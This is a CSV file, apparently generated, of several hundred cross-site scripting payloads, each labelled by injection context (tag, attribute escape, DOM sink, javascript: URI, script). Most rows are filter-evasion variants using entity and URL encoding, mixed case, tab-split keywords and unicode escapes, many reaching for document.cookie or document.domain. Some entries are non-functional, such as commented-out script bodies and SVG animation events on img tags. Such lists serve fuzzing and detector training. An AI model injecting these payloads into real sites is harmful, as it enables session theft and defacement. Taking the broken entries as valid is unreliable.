payload,context
"%3Cimg onanimationiteration=alert(String.fromCharCode(88,83,83))%3E",tag_injection
%3Cimg onanimationstart=console.log(location.hash)%3E,tag_injection
%22 onanimationiteration=console.log(%27XSS%27) %22,attribute_escape
<imG oNrePeaT=cOnsOle.loG(dOcuMenT.cOokIe)/>,tag_injection
' onb&#101;gin=confirm('XSS') ',attribute_escape
"""><Img onBegIn=AleRt(1)>",tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>""",dom_sink
"LocAtiOn.HreF=""JavAscRipT:cOnfIrm(doCumEnt.doMaiN)""",dom_sink
' on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
' onrepeat=\u0061lert(document.cookie) ',attribute_escape
j&#97;vascr	ipt:confirm(document.domain),js_uri
"%22 onrepeat=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
<img onerror=prompt(document.domain)/>,tag_injection
""" oNfoCus=alErt(1) auTofOcuS=""",attribute_escape
<img onb&#101;gin=consol&#101;.log('XSS')/>,tag_injection
"j&#97;vascr	ipt:confirm(String.fromCharCode(88,83,83))",js_uri
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(doCumEnt.coOkiE)>""",dom_sink
"""><img onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
j&#97;vascr	ipt:console.log(1),js_uri
<script>//console.log(location.hash)</script>,script_injection
<scRipT>/*/cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
"""%3E%3Cimg onload=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
"""><img onrepeat=confirm('XSS')>",tag_injection
"<img on&#97;nim&#97;tion&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>"")",dom_sink
javascr	ipt:confirm(location.hash),js_uri
""" onend=console.log(document.domain) """,attribute_escape
"<script>&#97;l&#101;rt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection
"""><Img onBegIn=AleRt('XSS')>",tag_injection
"%22 onend=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
""" oNloAd=ConFirM(1) """,attribute_escape
' onload=confirm(document.domain) ',attribute_escape
' onr&#101;p&#101;&#97;t=prompt(1) ',attribute_escape
%3Cimg onrepeat=alert('XSS')/%3E,tag_injection
<scRipT>//coNfiRm(DocUmeNt.DomAin)</ScrIpt>,script_injection
' on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
""" onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
""" onfocus=alert(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
<img onend=prompt(%27XSS%27)/>,tag_injection
<imG oNanImaTioNitEraTioN=aLerT('XSS')/>,tag_injection
<img onanimationend=alert(document.cookie)>,tag_injection
<scr	ipt>/x/confirm(document.domain)</scr	ipt>,script_injection
"%22><img onrepeat=console.log(String.fromCharCode(88,83,83))>",tag_injection
<scRipT>aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection
%3Cscript%3E/x/prompt(document.domain)%3C/script%3E,script_injection
"""%3E%3Cimg onend=console.log('XSS')%3E",tag_injection
<imG oNenD=cOnfIrm(1)/>,tag_injection
""" onload=confirm(document.domain) """,attribute_escape
' on&#101;rror=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
<img onrepeat=prompt(1)/>,tag_injection
<img onrepeat=\u0061lert(location.hash)>,tag_injection
"""><img onbegin=prompt('XSS')>",tag_injection
%3Cimg onend=console.log(document.cookie)/%3E,tag_injection
<scRipT>/X/pRomPt(DocUmeNt.CooKie)</ScrIpt>,script_injection
%3Cimg onend=confirm(location.hash)/%3E,tag_injection
""" oNerRor=prOmpT(dOcuMenT.dOmaIn) """,attribute_escape
""" onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in) &#97;utofocus=""",attribute_escape
<imG oNanImaTioNenD=pRomPt(1)>,tag_injection
""" oNenD=pRomPt('XSS') """,attribute_escape
""" oNloAd=AleRt(DocUmeNt.DomAin) """,attribute_escape
"' onanimationcancel=alert(String.fromCharCode(88,83,83)) '",attribute_escape
%3Cimg onerror=confirm('XSS')/%3E,tag_injection
""" onend=console.log('XSS') """,attribute_escape
""" on&#97;nim&#97;tion&#101;nd=prompt(1) """,attribute_escape
<script>//&#97;l&#101;rt(1)</script>,script_injection
' onbegin=prompt('XSS') ',attribute_escape
"j&#97;vascr	ipt:alert(String.fromCharCode(88,83,83))",js_uri
"%22><img onload=confirm(String.fromCharCode(88,83,83))>",tag_injection
%22><img onload=prompt(%27XSS%27)>,tag_injection
""" onanimationcancel=alert('XSS') """,attribute_escape
""" onanimationend=confirm('XSS') """,attribute_escape
<script>/*/&#97;l&#101;rt(1)</script>,script_injection
<script>/x/console.log(document.domain)</script>,script_injection
"""><Img onRepEat=coNfiRm('XSS')>",tag_injection
javascript:prompt(document.domain),js_uri
<img onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
<img onload=alert(location.hash)>,tag_injection
' oNloAd=ConFirM(dOcuMenT.cOokIe) ',attribute_escape
""" oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
javascript:void(alert('XSS')),js_uri
<img onlo&#97;d=&#97;l&#101;rt('XSS')>,tag_injection
<imG oNanImaTioNenD=aLerT(dOcuMenT.dOmaIn)/>,tag_injection
"LocAtiOn.HreF=""JavAscRipT:pRomPt('XSS')""",dom_sink
<img onr&#101;p&#101;&#97;t=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
javascr	ipt:prompt(document.domain),js_uri
<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
""" onanimationend=\u0061lert(location.hash) """,attribute_escape
"<imG oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
' oNbeGin=prOmpT(dOcuMenT.dOmaIn) ',attribute_escape
"""><Img onLoaD=cOnfIrm('XSS')>",tag_injection
"""><img onerror=confirm(location.hash)>",tag_injection
%22 onanimationend=console.log(document.cookie) %22,attribute_escape
"<scr	ipt>confirm`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection
<img onbegin=prompt(%27XSS%27)/>,tag_injection
<imG oNrePeaT=aLerT('XSS')/>,tag_injection
%3Cimg onend=confirm(document.domain)%3E,tag_injection
' oNanImaTioNstArt=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
""" on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"""><img onload=prompt(document.cookie)>",tag_injection
"LocAtiOn.HreF=""JavAscRipT:pRomPt(1)""",dom_sink
javascr	ipt:void(console.log(document.domain)),js_uri
"""%3E%3Cimg onrepeat=alert('XSS')%3E",tag_injection
' onanimationstart=\u0061lert(document.domain) ',attribute_escape
%27 onload=prompt(document.domain) %27,attribute_escape
<img onerror=confirm(location.hash)>,tag_injection
%22><img onend=alert(document.domain)>,tag_injection
' on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
%27 onend=console.log(1) %27,attribute_escape
' oNenD=cOnsOle.loG('XSS') ',attribute_escape
"""><img onanimationstart=prompt(1)>",tag_injection
"javascr	ipt:alert(String.fromCharCode(88,83,83))",js_uri
"%22 onanimationend=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
"EvaL(""ConFirM(dOcuMenT.cOokIe)"")",dom_sink
<imG oNloAd=ConSolE.lOg(DocUmeNt.CooKie)/>,tag_injection
document.write(%22<img src=x onerror=alert(document.cookie)>%22),dom_sink
"""%3E%3Cimg onanimationiteration=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
""" oNanImaTioNitEraTioN=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
' onanimationstart=console.log(location.hash) ',attribute_escape
<img onr&#101;p&#101;&#97;t=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNenD=aLerT('XSS') """,attribute_escape
"""><img onbegin=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
%22><img onbegin=console.log(document.domain)>,tag_injection
"""%3E%3Cimg onerror=console.log(1)%3E",tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt('XSS') ',attribute_escape
"%22 onanimationiteration=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
"' onrepeat=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
<img on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)>,tag_injection
"""><img on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
<scr	ipt>confirm`'XSS'`</scr	ipt>,script_injection
"""><img onend=prompt(document.cookie)>",tag_injection
<img onend=alert('XSS')/>,tag_injection
""" oNanImaTioNenD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
""" oNenD=cOnsOle.loG(dOcuMenT.cOokIe) """,attribute_escape
<scr	ipt>/*/confirm(document.cookie)</scr	ipt>,script_injection
<img onanimationstart=prompt(%27XSS%27)>,tag_injection
"""><Img onLoaD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
%22><img onanimationiteration=confirm(document.cookie)>,tag_injection
%22 onanimationiteration=prompt(document.domain) %22,attribute_escape
<imG oNanImaTioNitEraTioN=cOnfIrm(1)/>,tag_injection
<imG oNbeGin=coNsoLe.Log(loCatIon.haSh)/>,tag_injection
"<script>/x/confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"<script>/*/alert(String.fromCharCode(88,83,83))</script>",script_injection
<script>prompt`loc&#97;tion.h&#97;sh`</script>,script_injection
%3Cscript%3Econfirm`document.cookie`%3C/script%3E,script_injection
' onerror=\u0061lert(1) ',attribute_escape
""" oNfoCus=coNsoLe.Log(1) auTofOcuS=""",attribute_escape
"%3Cscript%3E/x/prompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"setTimeout(""confirm(document.cookie)"",0)",dom_sink
<img onanimationstart=confirm(location.hash)/>,tag_injection
' onr&#101;p&#101;&#97;t=&#97;l&#101;rt('XSS') ',attribute_escape
%27 onanimationstart=confirm(1) %27,attribute_escape
j&#97;vascript:console.log(document.cookie),js_uri
""" on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
%22 onend=console.log(location.hash) %22,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))""",dom_sink
""" on&#101;nd=&#97;l&#101;rt('XSS') """,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=prompt(1)>""",dom_sink
' oNbeGin=coNfiRm(LocAtiOn.HasH) ',attribute_escape
<img on&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
<img on&#101;rror=prompt(1)>,tag_injection
""" onanimationcancel=\u0061lert(document.cookie) """,attribute_escape
"SetTimEouT(""ProMpt(loCatIon.haSh)"",0)",dom_sink
<img onanimationcancel=alert(document.domain)>,tag_injection
"""><img onanimationiteration=alert(1)>",tag_injection
""" oNenD=pRomPt(LocAtiOn.HasH) """,attribute_escape
<imG oNenD=pRomPt(DocUmeNt.DomAin)/>,tag_injection
"""><Img onAniMatIonIteRatIon=prOmpT('XSS')>",tag_injection
%22 onrepeat=confirm(1) %22,attribute_escape
"javascr	ipt:void(prompt(String.fromCharCode(88,83,83)))",js_uri
<img onanimationstart=confirm(1)/>,tag_injection
<script>\u0061lert(document.domain)</script>,script_injection
<img onanimationiteration=console.log(location.hash)>,tag_injection
<script>confirm`%27XSS%27`</script>,script_injection
""" onb&#101;gin=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"eval(""alert(location.hash)"")",dom_sink
"<img onanimationend=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(1)>",tag_injection
' onend=\u0061lert(document.domain) ',attribute_escape
%22 onerror=confirm(1) %22,attribute_escape
""" oNanImaTioNstArt=alErt(loCatIon.haSh) """,attribute_escape
""" oNerRor=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape
%22 onend=console.log(%27XSS%27) %22,attribute_escape
"""><Img onAniMatIonIteRatIon=prOmpT(1)>",tag_injection
%22 onanimationend=prompt(document.domain) %22,attribute_escape
%27 onanimationcancel=alert(document.cookie) %27,attribute_escape
""" onload=prompt('XSS') """,attribute_escape
%27 onanimationend=prompt(document.cookie) %27,attribute_escape
"%22 onload=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
<img onerror=console.log(location.hash)/>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(lOcaTioN.hAsh)>"")",dom_sink
"""%3E%3Cimg onbegin=console.log(document.cookie)%3E",tag_injection
' onanimationstart=prompt('XSS') ',attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(document.cookie)%3E""",dom_sink
"""><Img onRepEat=prOmpT(dOcuMenT.cOokIe)>",tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)>,tag_injection
<img onb&#101;gin=consol&#101;.log(1)>,tag_injection
j&#97;v&#97;script:confirm(1),js_uri
""" oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) aUtoFocUs=""",attribute_escape
<img onanimationcancel=alert('XSS')/>,tag_injection
"&#101;v&#97;l(""prompt(docum&#101;nt.dom&#97;in)"")",dom_sink
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in)""",dom_sink
"""%3E%3Cimg onerror=confirm(document.domain)%3E",tag_injection
""" oNerRor=prOmpT(1) """,attribute_escape
<scRipT>/X/aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection
<img onanimationend=prompt(document.domain)/>,tag_injection
"document.write(""<img src=x onerror=alert(document.domain)>"")",dom_sink
"document.body.innerHTML=""%3Cimg src=x onerror=alert(document.cookie)%3E""",dom_sink
"""><Img onLoaD=aLerT(1)>",tag_injection
"""><Img onRepEat=prOmpT(1)>",tag_injection
%22><img onbegin=confirm(1)>,tag_injection
j&#97;vascript:confirm(location.hash),js_uri
""" on&#101;rror=consol&#101;.log('XSS') """,attribute_escape
""" oNanImaTioNitEraTioN=cOnsOle.loG(lOcaTioN.hAsh) """,attribute_escape
' on&#101;rror=confirm(1) ',attribute_escape
""" onload=\u0061lert(document.domain) """,attribute_escape
"s&#101;tTim&#101;out(""prompt(docum&#101;nt.dom&#97;in)"",0)",dom_sink
<script>/*/prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
"<imG oNanImaTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<imG oNenD=cOnfIrm(1)>,tag_injection
"%3Cimg onanimationend=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
<imG oNanImaTioNitEraTioN=pRomPt(1)>,tag_injection
"<img onrepeat=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
""" onbegin=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
"""><img onr&#101;p&#101;&#97;t=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
%22 onanimationend=prompt(document.cookie) %22,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(STriNg.FroMChArCOde(88,83,83))>""",dom_sink
"""%3E%3Cimg onanimationiteration=console.log(location.hash)%3E",tag_injection
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh)""",dom_sink
' onanimationstart=prompt(document.cookie) ',attribute_escape
' onanimationiteration=\u0061lert(document.domain) ',attribute_escape
"location.href=""javascript:confirm(document.domain)""",dom_sink
<script>//confirm(loc&#97;tion.h&#97;sh)</script>,script_injection
""" on&#101;nd=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
' oNrePeaT=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape
"""><img onload=\u0061lert(1)>",tag_injection
<script>confirm(document.cookie)</script>,script_injection
<img on&#97;nim&#97;tionst&#97;rt=prompt('XSS')/>,tag_injection
""" oNloAd=ConSolE.lOg(DocUmeNt.CooKie) """,attribute_escape
' on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
<imG oNanImaTioNenD=cOnfIrm(1)>,tag_injection
<img onanimationcancel=prompt(1)/>,tag_injection
<imG oNanImaTioNenD=cOnsOle.loG(dOcuMenT.cOokIe)/>,tag_injection
"%3Cimg onload=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
javascr	ipt:prompt(1),js_uri
""" onlo&#97;d=prompt('XSS') """,attribute_escape
<script>/*/alert(location.hash)</script>,script_injection
' onanimationiteration=alert(location.hash) ',attribute_escape
<img onload=confirm(location.hash)>,tag_injection
<img onanimationstart=prompt(%27XSS%27)/>,tag_injection
<scr	ipt>/*/confirm('XSS')</scr	ipt>,script_injection
' onanimationiteration=alert(document.cookie) ',attribute_escape
%3Cimg onanimationiteration=console.log(document.cookie)/%3E,tag_injection
"""><img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"document.write(""%3Cimg src=x onerror=alert(location.hash)%3E"")",dom_sink
' oNbeGin=prOmpT(dOcuMenT.cOokIe) ',attribute_escape
' on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
"<imG oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<img onlo&#97;d=confirm('XSS')/>,tag_injection
""" onanimationcancel=\u0061lert(location.hash) """,attribute_escape
"""><img onbegin=prompt(String.fromCharCode(88,83,83))>",tag_injection
"%3Cimg onrepeat=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
<script>/x/confirm(%27XSS%27)</script>,script_injection
<scRipT>aLerT(1)</ScrIpt>,script_injection
<img onanimationiteration=console.log(1)/>,tag_injection
%3Cimg onend=confirm('XSS')/%3E,tag_injection
"""><img onload=alert(document.domain)>",tag_injection
"""><img onload=confirm(document.cookie)>",tag_injection
""" onerror=\u0061lert(1) """,attribute_escape
' on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt('XSS') ',attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=prompt('XSS') """,attribute_escape
<script>/x/consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
""" onanimationend=alert(1) """,attribute_escape
%27 onanimationend=alert(document.domain) %27,attribute_escape
<img onerror=console.log(document.domain)/>,tag_injection
"""><Img onEnd=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<img onanimationstart=alert('XSS')>,tag_injection
"""%3E%3Cimg onend=alert(location.hash)%3E",tag_injection
%22><img onerror=confirm(document.cookie)>,tag_injection
<script>confirm`document.domain`</script>,script_injection
<scr	ipt>/x/prompt('XSS')</scr	ipt>,script_injection
%3Cimg onerror=console.log(document.cookie)%3E,tag_injection
"""><img onload=alert(String.fromCharCode(88,83,83))>",tag_injection
""" onanimationstart=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
"""><img onanimationstart=prompt(location.hash)>",tag_injection
<imG oNanImaTioNcaNceL=pRomPt('XSS')>,tag_injection
<img onb&#101;gin=&#97;l&#101;rt(1)>,tag_injection
<script>/*/prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
"' oNrePeaT=pRomPt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"setTimeout(""\u0061lert(String.fromCharCode(88,83,83))"",0)",dom_sink
<scr	ipt>//console.log('XSS')</scr	ipt>,script_injection
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
<img on&#101;nd=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<imG oNanImaTioNenD=aLerT(lOcaTioN.hAsh)>,tag_injection
<img onerror=prompt('XSS')>,tag_injection
"""><Img onErrOr=ProMpt(1)>",tag_injection
document.write(%22<img src=x onerror=console.log(document.cookie)>%22),dom_sink
<scRipT>pRomPt`DocUmeNt.CooKie`</ScrIpt>,script_injection
"<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<imG oNanImaTioNstArt=prOmpT(1)>,tag_injection
%3Cimg onload=alert('XSS')%3E,tag_injection
<img onanimationiteration=alert('XSS')/>,tag_injection
' oNenD=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG(lOcaTioN.hAsh)>""",dom_sink
%22 onend=alert(document.cookie) %22,attribute_escape
JavAscRipT:cOnsOle.loG('XSS'),js_uri
<scr	ipt>//prompt(document.cookie)</scr	ipt>,script_injection
<img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
